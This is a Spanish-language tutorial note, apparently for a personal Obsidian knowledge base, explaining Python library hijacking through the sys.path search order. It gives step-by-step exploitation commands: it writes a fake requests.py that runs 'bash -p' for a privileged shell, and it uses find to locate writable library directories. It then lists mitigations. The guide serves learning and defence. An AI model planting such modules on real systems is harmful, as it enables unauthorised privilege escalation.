-- -

El **Python Library Hijacking** es una técnica de ataque que aprovecha la forma en la que Python busca y carga bibliotecas al ejecutar un script. Si un atacante puede colocar una biblioteca falsa en una ubicación accesible antes que la biblioteca original, el script cargará la biblioteca maliciosa en lugar de la legítima.

---

### 🔥 **¿Cómo Funciona el Ataque?**

Cuando un script de Python realiza una instrucción como:
```python
import requests
```
Python buscará el módulo **`requests`** siguiendo el orden de rutas definidas en la variable `sys.path`. El orden de búsqueda generalmente es el siguiente:

1. El **directorio actual de trabajo** desde donde se ejecuta el script.
2. Directorios estándar del sistema.
3. Directorios de paquetes del usuario.

#### 💡 **Ejemplo de Rutas (`sys.path`):**
```python
['', '/usr/lib/python311.zip', '/usr/lib/python3.11', '/usr/lib/python3.11/lib-dynload', '/home/elgordoponcio/.local/lib/python3.11/site-packages', '/usr/local/lib/python3.11/dist-packages', '/usr/lib/python3/dist-packages']
```

---

## 💥 **Explotación: Secuestro de Bibliotecas**

### 🧠 **Paso 1: Verificar el Directorio de Trabajo**
Si tenemos acceso al directorio donde reside el script Python, lo comprobamos con:
```bash
pwd
```

---

### ✏️ **Paso 2: Crear la Biblioteca Maliciosa**
Creamos un archivo con el mismo nombre que la biblioteca legítima:
```bash
echo 'import os; os.system("bash -p")' > requests.py
chmod +x requests.py
```
- El archivo malicioso ejecutará una shell con privilegios si el script es ejecutado con permisos elevados.

---

### 📝 **Paso 3: Verificar Permisos en Rutas Alternativas**
Si no podemos escribir en el directorio actual, podemos buscar en rutas accesibles dentro de la lista de `sys.path`:
```bash
find /usr/lib/ -type d -writable 2>/dev/null
find /usr/local/lib/ -type d -writable 2>/dev/null
```
- Si encontramos un directorio escribible, podemos copiar el archivo malicioso allí.  

---

## 🚩 **Ejecución del Ataque**
Una vez creado el archivo malicioso en el directorio adecuado, simplemente ejecutamos el script vulnerable que importe la biblioteca.  
El resultado será una shell privilegiada si el script fue ejecutado con permisos elevados.

---

## 🛡️ **Mitigación de Python Library Hijacking**
1. **Usar Rutas Absolutas:** Siempre que sea posible, utilizar rutas absolutas en el código.
2. **Entornos Virtuales:** Los entornos aislados ayudan a reducir el riesgo de carga de bibliotecas maliciosas.
3. **Permisos de Escritura Restringidos:** Asegúrate de que solo los usuarios privilegiados puedan modificar bibliotecas en rutas críticas.
4. **Verificar `sys.path`:** Revisar y controlar qué rutas están incluidas en la variable de entorno.

---

💡 **Tip:** Guarda esta guía en Obsidian para tener siempre a mano los conceptos y técnicas de Python Library Hijacking. 📝